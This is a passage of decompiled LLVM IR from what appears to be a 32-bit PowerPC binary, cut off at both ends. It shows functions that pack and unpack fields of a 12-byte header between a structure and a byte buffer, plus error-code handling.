  store i8 0, i8* %v3_1000c7c8, align 1
  %v0_1000c7cc = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000c7cc = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000c7cc = or i1 %v0_1000c7cc, %v1_1000c7cc
  br i1 %v2_1000c7cc, label %dec_label_pc_1000c7e4, label %dec_label_pc_1000c7d0

dec_label_pc_1000c7d0:                            ; preds = %dec_label_pc_1000c7b4
  %v0_1000c7d0 = call i32 @function_10004e38()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000c7dc = inttoptr i32 %v0_1000c7d0 to i32*
  store i32 28, i32* %v2_1000c7dc, align 4
  %v0_1000c808.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c804

dec_label_pc_1000c7e4:                            ; preds = %dec_label_pc_1000c7b4
  %v0_1000c7e4 = load i32, i32* @r25, align 4
  %v2_1000c7e8 = bitcast i32* %stack_var_-88 to i8*
  %v3_1000c7e8 = call i32 @function_10007264(i32 %v0_1000c7e4, i8* %v2_1000c7e8)
  br label %dec_label_pc_1000c7ec

dec_label_pc_1000c7ec:                            ; preds = %dec_label_pc_1000c5a8, %dec_label_pc_1000c7e4
  %storemerge1 = phi i32 [ %v3_1000c5b4, %dec_label_pc_1000c5a8 ], [ %v3_1000c7e8, %dec_label_pc_1000c7e4 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c804

dec_label_pc_1000c7f4:                            ; preds = %dec_label_pc_1000c59c
  %v0_1000c7f4 = call i32 @function_10004e38()
  %v2_1000c7fc = inttoptr i32 %v0_1000c7f4 to i32*
  store i32 97, i32* %v2_1000c7fc, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c804

dec_label_pc_1000c804:                            ; preds = %dec_label_pc_1000c734, %dec_label_pc_1000c7ec, %dec_label_pc_1000c7d0, %dec_label_pc_1000c7f4
  %v0_1000c808 = phi i32 [ 0, %dec_label_pc_1000c734 ], [ %storemerge1, %dec_label_pc_1000c7ec ], [ %v0_1000c808.pre, %dec_label_pc_1000c7d0 ], [ 0, %dec_label_pc_1000c7f4 ]
  ret i32 %v0_1000c808

; uselistorder directives
  uselistorder i32 %v2_1000c7c8, { 1, 0 }
  uselistorder i32 %v2_1000c79c, { 1, 0 }
  uselistorder i1 %v3_1000c6bc, { 0, 2, 1 }
  uselistorder i32 %v0_1000c6bc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000c788, { 2, 1, 0 }
  uselistorder i32 %v0_1000c74066, { 1, 0 }
  uselistorder i32 %v3_1000c744, { 1, 0 }
  uselistorder i32 %v0_1000c710, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000c700.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1000c6fc, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1000c6cc, { 1, 0 }
  uselistorder i32 %v0_1000c6ec, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1000c6cc, { 0, 2, 1 }
  uselistorder i32 %v2_1000c6f8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000c6bc3, { 0, 2, 1 }
  uselistorder i32 %v0_1000c6a4, { 2, 1, 0 }
  uselistorder i32 %v0_1000c694.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1000c69c, { 1, 0, 2 }
  uselistorder i32 %v1_1000c678, { 2, 1, 0 }
  uselistorder i32 %v1_1000c674, { 1, 0 }
  uselistorder i32 %v0_1000c65839, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1000c66842, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1000c62c, { 1, 0 }
  uselistorder i32 %v0_1000c674, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1000c62c, { 1, 0 }
  uselistorder i32 %v0_1000c658, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1000c668, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000c608, { 1, 0 }
  uselistorder i32 %v2_1000c600, { 1, 0 }
  uselistorder i32 %v0_1000c5f8, { 1, 0, 2 }
  uselistorder i32 %v1_1000c5e0, { 1, 0 }
  uselistorder i32 %v2_1000c5bc, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 19, 12, 17, 14, 13, 15, 16 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 19, 12, 17, 14, 13, 15, 16 }
  uselistorder i32 97, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 (i32, i8*)* @function_10007264, { 0, 1, 4, 5, 6, 7, 2, 3, 8, 9 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10004fac, { 1, 0 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 5, 0, 6, 10, 11, 7, 8, 9, 12 }
  uselistorder i1 true, { 2, 3, 5, 4, 0, 1 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_100071a0, { 15, 14, 9, 2, 8, 7, 4, 0, 1, 3, 13, 12, 11, 10, 6, 5 }
  uselistorder i32 (i32, i32, i32)* @function_1000c418, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c804, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c7ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c788, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c764, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000c6bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c694, { 1, 0 }
  uselistorder label %dec_label_pc_1000c674, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c670, { 1, 0 }
  uselistorder label %dec_label_pc_1000c628, { 1, 0 }
  uselistorder label %dec_label_pc_1000c5e0, { 1, 0 }
}

define i32 @function_1000c81c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c81c:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r6.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_1000c900, label %dec_label_pc_1000c828

dec_label_pc_1000c828:                            ; preds = %dec_label_pc_1000c81c
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1000c828 = add i32 %tmp, 2
  %v2_1000c828 = inttoptr i32 %v1_1000c828 to i8*
  %v3_1000c828 = load i8, i8* %v2_1000c828, align 1
  store i32 12, i32* %r6.global-to-local, align 4
  store i8 %v3_1000c828, i8* %tmp3, align 1
  %v2_1000c834 = load i32, i32* %arg1, align 4
  %v1_1000c838 = trunc i32 %v2_1000c834 to i8
  %v4_1000c838 = add i32 %arg2, 1
  %v5_1000c838 = inttoptr i32 %v4_1000c838 to i8*
  store i8 %v1_1000c838, i8* %v5_1000c838, align 1
  %v1_1000c83c = add i32 %tmp, 12
  %v2_1000c83c = inttoptr i32 %v1_1000c83c to i32*
  %v3_1000c83c = load i32, i32* %v2_1000c83c, align 4
  %v1_1000c840 = add i32 %tmp, 16
  %v2_1000c840 = inttoptr i32 %v1_1000c840 to i32*
  %v3_1000c840 = load i32, i32* %v2_1000c840, align 4
  store i32 %v3_1000c840, i32* %r11.global-to-local, align 4
  %v1_1000c844 = add i32 %tmp, 4
  %v2_1000c844 = inttoptr i32 %v1_1000c844 to i32*
  %v3_1000c844 = load i32, i32* %v2_1000c844, align 4
  %v1_1000c848 = add i32 %tmp, 8
  %v2_1000c848 = inttoptr i32 %v1_1000c848 to i32*
  %v3_1000c848 = load i32, i32* %v2_1000c848, align 4
  %v1_1000c84c = add i32 %tmp, 20
  %v2_1000c84c = inttoptr i32 %v1_1000c84c to i32*
  %v3_1000c84c = load i32, i32* %v2_1000c84c, align 4
  store i32 %v3_1000c84c, i32* %r7.global-to-local, align 4
  %v2_1000c850 = icmp ne i32 %v3_1000c83c, 0
  %v5_1000c854 = zext i1 %v2_1000c850 to i32
  store i32 %v5_1000c854, i32* %r10.global-to-local, align 4
  %not.v2_1000c858 = icmp eq i32 %v3_1000c844, 0
  %v6_1000c85c = sext i1 %not.v2_1000c858 to i32
  %v2_1000c860 = icmp ne i32 %v3_1000c840, 0
  %v5_1000c864 = zext i1 %v2_1000c860 to i32
  store i32 %v5_1000c864, i32* %r11.global-to-local, align 4
  %v1_1000c86c = call i32 @__asm_rlwinm(i32 %v6_1000c85c, i32 0, i32 24, i32 24)
  %v0_1000c870 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c870 = mul i32 %v0_1000c870, 4
  store i32 %v1_1000c870, i32* %r10.global-to-local, align 4
  %v1_1000c874 = call i32 @__asm_rlwinm(i32 %v3_1000c848, i32 3, i32 25, i32 28)
  %v1_1000c878 = add i32 %v1_1000c86c, 128
  %v0_1000c87c = load i32, i32* %r7.global-to-local, align 4
  %v2_1000c87c = icmp ne i32 %v0_1000c87c, 0
  %v5_1000c880 = zext i1 %v2_1000c87c to i32
  %v2_1000c884 = or i32 %v1_1000c870, %v1_1000c874
  store i32 %v2_1000c884, i32* %r10.global-to-local, align 4
  %v0_1000c888 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c888 = mul i32 %v0_1000c888, 2
  store i32 %v1_1000c888, i32* %r11.global-to-local, align 4
  %v2_1000c88c = or i32 %v2_1000c884, %v5_1000c880
  %v2_1000c890 = or i32 %v2_1000c88c, %v1_1000c878
  %v2_1000c894 = or i32 %v2_1000c890, %v1_1000c888
  %v1_1000c898 = trunc i32 %v2_1000c894 to i8
  %v4_1000c898 = add i32 %arg2, 2
  %v5_1000c898 = inttoptr i32 %v4_1000c898 to i8*
  store i8 %v1_1000c898, i8* %v5_1000c898, align 1
  %v1_1000c89c = add i32 %tmp, 24
  %v2_1000c89c = inttoptr i32 %v1_1000c89c to i32*
  %v3_1000c89c = load i32, i32* %v2_1000c89c, align 4
  %v1_1000c8a0 = add i32 %tmp, 28
  %v2_1000c8a0 = inttoptr i32 %v1_1000c8a0 to i32*
  %v3_1000c8a0 = load i32, i32* %v2_1000c8a0, align 4
  %not.v2_1000c8a4 = icmp eq i32 %v3_1000c89c, 0
  %v6_1000c8a8 = sext i1 %not.v2_1000c8a4 to i32
  %v1_1000c8ac = call i32 @__asm_rlwinm(i32 %v6_1000c8a8, i32 0, i32 24, i32 24)
  %v1_1000c8b0 = urem i32 %v3_1000c8a0, 16
  %v1_1000c8b4 = add i32 %v1_1000c8ac, 128
  %v2_1000c8b8 = or i32 %v1_1000c8b0, %v1_1000c8b4
  %v1_1000c8bc = trunc i32 %v2_1000c8b8 to i8
  %v4_1000c8bc = add i32 %arg2, 3
  %v5_1000c8bc = inttoptr i32 %v4_1000c8bc to i8*
  store i8 %v1_1000c8bc, i8* %v5_1000c8bc, align 1
  %v1_1000c8c0 = add i32 %tmp, 34
  %v2_1000c8c0 = inttoptr i32 %v1_1000c8c0 to i8*
  %v3_1000c8c0 = load i8, i8* %v2_1000c8c0, align 1
  %v4_1000c8c4 = add i32 %arg2, 4
  %v5_1000c8c4 = inttoptr i32 %v4_1000c8c4 to i8*
  store i8 %v3_1000c8c0, i8* %v5_1000c8c4, align 1
  %v1_1000c8c8 = add i32 %tmp, 32
  %v2_1000c8c8 = inttoptr i32 %v1_1000c8c8 to i32*
  %v3_1000c8c8 = load i32, i32* %v2_1000c8c8, align 4
  %v1_1000c8cc = trunc i32 %v3_1000c8c8 to i8
  %v4_1000c8cc = add i32 %arg2, 5
  %v5_1000c8cc = inttoptr i32 %v4_1000c8cc to i8*
  store i8 %v1_1000c8cc, i8* %v5_1000c8cc, align 1
  %v1_1000c8d0 = add i32 %tmp, 38
  %v2_1000c8d0 = inttoptr i32 %v1_1000c8d0 to i8*
  %v3_1000c8d0 = load i8, i8* %v2_1000c8d0, align 1
  %v4_1000c8d4 = add i32 %arg2, 6
  %v5_1000c8d4 = inttoptr i32 %v4_1000c8d4 to i8*
  store i8 %v3_1000c8d0, i8* %v5_1000c8d4, align 1
  %v1_1000c8d8 = add i32 %tmp, 36
  %v2_1000c8d8 = inttoptr i32 %v1_1000c8d8 to i32*
  %v3_1000c8d8 = load i32, i32* %v2_1000c8d8, align 4
  %v1_1000c8dc = trunc i32 %v3_1000c8d8 to i8
  %v4_1000c8dc = add i32 %arg2, 7
  %v5_1000c8dc = inttoptr i32 %v4_1000c8dc to i8*
  store i8 %v1_1000c8dc, i8* %v5_1000c8dc, align 1
  %v1_1000c8e0 = add i32 %tmp, 42
  %v2_1000c8e0 = inttoptr i32 %v1_1000c8e0 to i8*
  %v3_1000c8e0 = load i8, i8* %v2_1000c8e0, align 1
  %v4_1000c8e4 = add i32 %arg2, 8
  %v5_1000c8e4 = inttoptr i32 %v4_1000c8e4 to i8*
  store i8 %v3_1000c8e0, i8* %v5_1000c8e4, align 1
  %v1_1000c8e8 = add i32 %tmp, 40
  %v2_1000c8e8 = inttoptr i32 %v1_1000c8e8 to i32*
  %v3_1000c8e8 = load i32, i32* %v2_1000c8e8, align 4
  %v1_1000c8ec = trunc i32 %v3_1000c8e8 to i8
  %v4_1000c8ec = add i32 %arg2, 9
  %v5_1000c8ec = inttoptr i32 %v4_1000c8ec to i8*
  store i8 %v1_1000c8ec, i8* %v5_1000c8ec, align 1
  %v1_1000c8f0 = add i32 %tmp, 46
  %v2_1000c8f0 = inttoptr i32 %v1_1000c8f0 to i8*
  %v3_1000c8f0 = load i8, i8* %v2_1000c8f0, align 1
  %v4_1000c8f4 = add i32 %arg2, 10
  %v5_1000c8f4 = inttoptr i32 %v4_1000c8f4 to i8*
  store i8 %v3_1000c8f0, i8* %v5_1000c8f4, align 1
  %v1_1000c8f8 = add i32 %tmp, 44
  %v2_1000c8f8 = inttoptr i32 %v1_1000c8f8 to i32*
  %v3_1000c8f8 = load i32, i32* %v2_1000c8f8, align 4
  %v1_1000c8fc = trunc i32 %v3_1000c8f8 to i8
  %v4_1000c8fc = add i32 %arg2, 11
  %v5_1000c8fc = inttoptr i32 %v4_1000c8fc to i8*
  store i8 %v1_1000c8fc, i8* %v5_1000c8fc, align 1
  %v0_1000c900.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000c900

dec_label_pc_1000c900:                            ; preds = %dec_label_pc_1000c81c, %dec_label_pc_1000c828
  %v0_1000c900 = phi i32 [ -1, %dec_label_pc_1000c81c ], [ %v0_1000c900.pre, %dec_label_pc_1000c828 ]
  ret i32 %v0_1000c900

; uselistorder directives
  uselistorder i32 %v1_1000c888, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 13, 1, 6, 9, 8, 12, 11, 10, 3, 2, 5, 4, 7 }
  uselistorder label %dec_label_pc_1000c900, { 1, 0 }
}

define i32 @function_1000c908(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c908:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000c908 = load i8, i8* %arg1, align 1
  %v4_1000c908 = zext i8 %v3_1000c908 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000c910 = add i32 %tmp, 1
  %v3_1000c910 = inttoptr i32 %v2_1000c910 to i8*
  %v4_1000c910 = load i8, i8* %v3_1000c910, align 1
  %v5_1000c910 = zext i8 %v4_1000c910 to i32
  %v1_1000c918 = mul nuw nsw i32 %v4_1000c908, 256
  %v2_1000c91c = or i32 %v5_1000c910, %v1_1000c918
  %v2_1000c920 = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000c91c, i32* %v2_1000c920, align 4
  %v0_1000c924 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c924 = add i32 %v0_1000c924, 2
  %v2_1000c924 = inttoptr i32 %v1_1000c924 to i8*
  %v3_1000c924 = load i8, i8* %v2_1000c924, align 1
  %v4_1000c924 = zext i8 %v3_1000c924 to i32
  %v1_1000c928 = call i32 @__asm_rlwinm(i32 %v4_1000c924, i32 25, i32 31, i32 31)
  %v2_1000c92c = add i32 %arg2, 4
  %v3_1000c92c = inttoptr i32 %v2_1000c92c to i32*
  store i32 %v1_1000c928, i32* %v3_1000c92c, align 4
  %v0_1000c930 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c930 = add i32 %v0_1000c930, 2
  %v2_1000c930 = inttoptr i32 %v1_1000c930 to i8*
  %v3_1000c930 = load i8, i8* %v2_1000c930, align 1
  %v4_1000c930 = zext i8 %v3_1000c930 to i32
  %v1_1000c934 = call i32 @__asm_rlwinm(i32 %v4_1000c930, i32 29, i32 28, i32 31)
  %v2_1000c938 = add i32 %arg2, 8
  %v3_1000c938 = inttoptr i32 %v2_1000c938 to i32*
  store i32 %v1_1000c934, i32* %v3_1000c938, align 4
  %v0_1000c93c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c93c = add i32 %v0_1000c93c, 2
  %v2_1000c93c = inttoptr i32 %v1_1000c93c to i8*
  %v3_1000c93c = load i8, i8* %v2_1000c93c, align 1
  %v4_1000c93c = zext i8 %v3_1000c93c to i32
  %v1_1000c940 = call i32 @__asm_rlwinm(i32 %v4_1000c93c, i32 30, i32 31, i32 31)
  %v2_1000c944 = add i32 %arg2, 12
  %v3_1000c944 = inttoptr i32 %v2_1000c944 to i32*
  store i32 %v1_1000c940, i32* %v3_1000c944, align 4
  %v0_1000c948 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c948 = add i32 %v0_1000c948, 2
  %v2_1000c948 = inttoptr i32 %v1_1000c948 to i8*
  %v3_1000c948 = load i8, i8* %v2_1000c948, align 1
  %v4_1000c948 = zext i8 %v3_1000c948 to i32
  %v1_1000c94c = call i32 @__asm_rlwinm(i32 %v4_1000c948, i32 31, i32 31, i32 31)
  %v2_1000c950 = add i32 %arg2, 16
  %v3_1000c950 = inttoptr i32 %v2_1000c950 to i32*
  store i32 %v1_1000c94c, i32* %v3_1000c950, align 4
  %v0_1000c954 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c954 = add i32 %v0_1000c954, 2
  %v2_1000c954 = inttoptr i32 %v1_1000c954 to i8*
  %v3_1000c954 = load i8, i8* %v2_1000c954, align 1
  %tmp1 = urem i8 %v3_1000c954, 2
  %v1_1000c958 = zext i8 %tmp1 to i32
  %v2_1000c95c = add i32 %arg2, 20
  %v3_1000c95c = inttoptr i32 %v2_1000c95c to i32*
  store i32 %v1_1000c958, i32* %v3_1000c95c, align 4
  %v0_1000c960 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c960 = add i32 %v0_1000c960, 3
  %v2_1000c960 = inttoptr i32 %v1_1000c960 to i8*
  %v3_1000c960 = load i8, i8* %v2_1000c960, align 1
  %v4_1000c960 = zext i8 %v3_1000c960 to i32
  %v1_1000c964 = call i32 @__asm_rlwinm(i32 %v4_1000c960, i32 25, i32 31, i32 31)
  %v2_1000c968 = add i32 %arg2, 24
  %v3_1000c968 = inttoptr i32 %v2_1000c968 to i32*
  store i32 %v1_1000c964, i32* %v3_1000c968, align 4
  %v0_1000c96c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c96c = add i32 %v0_1000c96c, 3
  %v2_1000c96c = inttoptr i32 %v1_1000c96c to i8*
  %v3_1000c96c = load i8, i8* %v2_1000c96c, align 1
  %tmp2 = urem i8 %v3_1000c96c, 16
  %v1_1000c970 = zext i8 %tmp2 to i32
  %v2_1000c974 = add i32 %arg2, 28
  %v3_1000c974 = inttoptr i32 %v2_1000c974 to i32*
  store i32 %v1_1000c970, i32* %v3_1000c974, align 4
  %v0_1000c978 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c978 = add i32 %v0_1000c978, 4
  %v2_1000c978 = inttoptr i32 %v1_1000c978 to i8*
  %v3_1000c978 = load i8, i8* %v2_1000c978, align 1
  %v4_1000c978 = zext i8 %v3_1000c978 to i32
  %v1_1000c97c = add i32 %v0_1000c978, 5
  %v2_1000c97c = inttoptr i32 %v1_1000c97c to i8*
  %v3_1000c97c = load i8, i8* %v2_1000c97c, align 1
  %v4_1000c97c = zext i8 %v3_1000c97c to i32
  %v1_1000c980 = mul nuw nsw i32 %v4_1000c978, 256
  %v2_1000c984 = or i32 %v4_1000c97c, %v1_1000c980
  %v2_1000c988 = add i32 %arg2, 32
  %v3_1000c988 = inttoptr i32 %v2_1000c988 to i32*
  store i32 %v2_1000c984, i32* %v3_1000c988, align 4
  %v0_1000c98c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c98c = add i32 %v0_1000c98c, 6
  %v2_1000c98c = inttoptr i32 %v1_1000c98c to i8*
  %v3_1000c98c = load i8, i8* %v2_1000c98c, align 1
  %v4_1000c98c = zext i8 %v3_1000c98c to i32
  %v1_1000c990 = add i32 %v0_1000c98c, 7
  %v2_1000c990 = inttoptr i32 %v1_1000c990 to i8*
  %v3_1000c990 = load i8, i8* %v2_1000c990, align 1
  %v4_1000c990 = zext i8 %v3_1000c990 to i32
  %v1_1000c994 = mul nuw nsw i32 %v4_1000c98c, 256
  %v2_1000c998 = or i32 %v4_1000c990, %v1_1000c994
  %v2_1000c99c = add i32 %arg2, 36
  %v3_1000c99c = inttoptr i32 %v2_1000c99c to i32*
  store i32 %v2_1000c998, i32* %v3_1000c99c, align 4
  %v0_1000c9a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c9a0 = add i32 %v0_1000c9a0, 8
  %v2_1000c9a0 = inttoptr i32 %v1_1000c9a0 to i8*
  %v3_1000c9a0 = load i8, i8* %v2_1000c9a0, align 1
  %v4_1000c9a0 = zext i8 %v3_1000c9a0 to i32
  %v1_1000c9a4 = add i32 %v0_1000c9a0, 9
  %v2_1000c9a4 = inttoptr i32 %v1_1000c9a4 to i8*
  %v3_1000c9a4 = load i8, i8* %v2_1000c9a4, align 1
  %v4_1000c9a4 = zext i8 %v3_1000c9a4 to i32
  %v1_1000c9a8 = mul nuw nsw i32 %v4_1000c9a0, 256
  %v2_1000c9ac = or i32 %v4_1000c9a4, %v1_1000c9a8
  %v2_1000c9b0 = add i32 %arg2, 40
  %v3_1000c9b0 = inttoptr i32 %v2_1000c9b0 to i32*
  store i32 %v2_1000c9ac, i32* %v3_1000c9b0, align 4
  %v0_1000c9b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c9b4 = add i32 %v0_1000c9b4, 10
  %v2_1000c9b4 = inttoptr i32 %v1_1000c9b4 to i8*
  %v3_1000c9b4 = load i8, i8* %v2_1000c9b4, align 1
  %v4_1000c9b4 = zext i8 %v3_1000c9b4 to i32
  %v1_1000c9b8 = add i32 %v0_1000c9b4, 11
  %v2_1000c9b8 = inttoptr i32 %v1_1000c9b8 to i8*
  %v3_1000c9b8 = load i8, i8* %v2_1000c9b8, align 1
  %v4_1000c9b8 = zext i8 %v3_1000c9b8 to i32
  store i32 %v4_1000c9b8, i32* %r9.global-to-local, align 4
  %v1_1000c9bc = mul nuw nsw i32 %v4_1000c9b4, 256
  %v2_1000c9c0 = or i32 %v4_1000c9b8, %v1_1000c9bc
  %v2_1000c9c4 = add i32 %arg2, 44
  %v3_1000c9c4 = inttoptr i32 %v2_1000c9c4 to i32*
  store i32 %v2_1000c9c0, i32* %v3_1000c9c4, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 2, 3, 7, 8, 9, 1, 6, 4, 0, 5 }
  uselistorder i32 11, { 8, 9, 11, 10, 4, 3, 12, 0, 1, 13, 14, 15, 16, 17, 2, 5, 6, 7 }
  uselistorder i32 40, { 4, 5, 8, 6, 7, 0, 9, 10, 11, 12, 13, 3, 2, 1 }
  uselistorder i32 7, { 9, 10, 1, 12, 13, 14, 15, 2, 3, 4, 5, 6, 7, 8, 11, 0 }
  uselistorder i32 5, { 18, 19, 12, 13, 14, 3, 4, 15, 5, 16, 17, 2, 1, 20, 21, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 28, { 15, 16, 17, 18, 2, 3, 6, 28, 32, 44, 19, 0, 20, 21, 22, 4, 5, 33, 12, 7, 14, 23, 29, 30, 24, 25, 34, 35, 36, 37, 38, 39, 42, 40, 41, 1, 43, 45, 31, 8, 9, 10, 11, 13, 26, 27 }
  uselistorder i32 29, { 8, 0, 1, 16, 17, 6, 7, 9, 10, 11, 12, 15, 2, 13, 3, 14, 20, 21, 18, 19, 4, 5 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @function_1000c9cc(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c9cc:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1000c9e8 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c9e8, i32* %r3.global-to-local, align 4
  store i32 268487152, i32* @lr, align 4
  %v1_1000c9ec = inttoptr i32 %v2_1000c9e8 to i8*
  %v2_1000c9ec = call i32 @function_1000d11c(i8* %v1_1000c9ec)
  store i32 %v2_1000c9ec, i32* %r3.global-to-local, align 4
  %v1_1000c9f0 = icmp slt i32 %v2_1000c9ec, 0
  %v1_1000c9f4 = load i32, i32* @r29, align 4
  %v2_1000c9f4 = sub i32 %v1_1000c9f4, %v2_1000c9ec
  store i32 %v2_1000c9f4, i32* @r29, align 4
  br i1 %v1_1000c9f0, label %dec_label_pc_1000ca34, label %dec_label_pc_1000ca00

dec_label_pc_1000ca00:                            ; preds = %dec_label_pc_1000c9cc
  %v2_1000c9f8 = icmp sgt i32 %v2_1000c9f4, 3
  %v0_1000ca00 = load i32, i32* @r30, align 4
  %v2_1000ca00 = add i32 %v0_1000ca00, %v2_1000c9ec
  store i32 %v2_1000ca00, i32* %r9.global-to-local, align 4
  br i1 %v2_1000c9f8, label %dec_label_pc_1000ca10, label %dec_label_pc_1000ca08

dec_label_pc_1000ca08:                            ; preds = %dec_label_pc_1000ca00
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca34

dec_label_pc_1000ca10:                            ; preds = %dec_label_pc_1000ca00
  %v0_1000ca10 = load i32, i32* @r31, align 4
  %v1_1000ca10 = add i32 %v0_1000ca10, 6
  %v2_1000ca10 = inttoptr i32 %v1_1000ca10 to i8*
  %v3_1000ca10 = load i8, i8* %v2_1000ca10, align 1
  %v5_1000ca14 = inttoptr i32 %v2_1000ca00 to i8*
  store i8 %v3_1000ca10, i8* %v5_1000ca14, align 1
  %v0_1000ca18 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ca18 = add i32 %v0_1000ca18, 4
  store i32 %v1_1000ca18, i32* %r3.global-to-local, align 4
  %v0_1000ca1c = load i32, i32* @r31, align 4
  %v1_1000ca1c = add i32 %v0_1000ca1c, 4
  %v2_1000ca1c = inttoptr i32 %v1_1000ca1c to i32*
  %v3_1000ca1c = load i32, i32* %v2_1000ca1c, align 4
  %v1_1000ca20 = trunc i32 %v3_1000ca1c to i8
  %v2_1000ca20 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ca20 = add i32 %v2_1000ca20, 1
  %v4_1000ca20 = inttoptr i32 %v3_1000ca20 to i8*
  store i8 %v1_1000ca20, i8* %v4_1000ca20, align 1
  %v0_1000ca24 = load i32, i32* @r31, align 4
  %v1_1000ca24 = add i32 %v0_1000ca24, 10
  %v2_1000ca24 = inttoptr i32 %v1_1000ca24 to i8*
  %v3_1000ca24 = load i8, i8* %v2_1000ca24, align 1
  %v2_1000ca28 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ca28 = add i32 %v2_1000ca28, 2
  %v4_1000ca28 = inttoptr i32 %v3_1000ca28 to i8*
  store i8 %v3_1000ca24, i8* %v4_1000ca28, align 1
  %v0_1000ca2c = load i32, i32* @r31, align 4
  %v1_1000ca2c = add i32 %v0_1000ca2c, 8
  %v2_1000ca2c = inttoptr i32 %v1_1000ca2c to i32*
  %v3_1000ca2c = load i32, i32* %v2_1000ca2c, align 4
  %v1_1000ca30 = trunc i32 %v3_1000ca2c to i8
  %v2_1000ca30 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ca30 = add i32 %v2_1000ca30, 3
  %v4_1000ca30 = inttoptr i32 %v3_1000ca30 to i8*
  store i8 %v1_1000ca30, i8* %v4_1000ca30, align 1
  %v0_1000ca44.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca34

dec_label_pc_1000ca34:                            ; preds = %dec_label_pc_1000c9cc, %dec_label_pc_1000ca08, %dec_label_pc_1000ca10
